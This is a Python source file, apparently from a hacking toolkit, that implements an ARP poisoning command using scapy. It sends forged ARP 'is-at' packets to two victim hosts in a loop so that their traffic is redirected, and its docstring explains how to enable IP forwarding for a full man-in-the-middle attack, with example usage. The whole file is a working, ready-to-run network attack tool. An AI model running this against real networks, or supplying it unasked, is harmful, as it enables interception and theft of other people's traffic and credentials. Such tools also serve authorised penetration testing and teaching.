#!/usr/bin/env python3

import logging
import time

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import ARP, Ether, conf, getmacbyip, sendp


@click.command()
@click.argument('t1')
@click.argument('t2')
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_arpoison(t1, t2, iface, verbose):
    """This command sends ARP 'is-at' packets to each victim, poisoning their
    ARP tables for send the traffic to your system.

    Note: If you want a full working Man In The Middle attack, you need
    to enable the packet forwarding on your operating system to act like a
    router. You can do that using:

    # echo 1 > /proc/sys/net/ipv4/ip_forward

    Example:

    \b
    # habu.arpoison 192.168.0.1 192.168.0.77
    Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
    Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.70
    Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
    ...
    """

    conf.verb = False

    if iface:
        conf.iface = iface

    mac1 = getmacbyip(t1)
    mac2 = getmacbyip(t2)

    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=t2, pdst=t1, hwdst=mac1)
    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=t1, pdst=t2, hwdst=mac2)

    try:
        while 1:
            sendp(pkt1)
            sendp(pkt2)

            if verbose:
                pkt1.show2()
                pkt2.show2()
            else:
                print(pkt1.summary())
                print(pkt2.summary())

            time.sleep(1)

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    cmd_arpoison()
